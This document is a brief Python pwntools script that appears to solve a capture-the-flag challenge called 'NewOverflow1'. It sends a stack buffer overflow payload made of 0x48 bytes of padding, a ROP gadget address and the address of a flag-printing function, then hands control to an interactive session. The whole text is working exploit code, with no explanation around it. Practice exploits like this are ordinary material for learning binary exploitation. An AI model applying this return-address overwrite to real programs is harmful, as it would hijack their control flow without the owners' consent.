from pwn import *

flag_add = 0x0000000000400767
rop = 0x00000000004005de 
a = process('./NewOverflow1')
raw_input('debug')
buf = 'a'*0x48
buf += p64(rop)
buf += p64(flag_add)

a.recvuntil('Give me a string that gets you the flag: ')
a.sendline(buf)
a.interactive()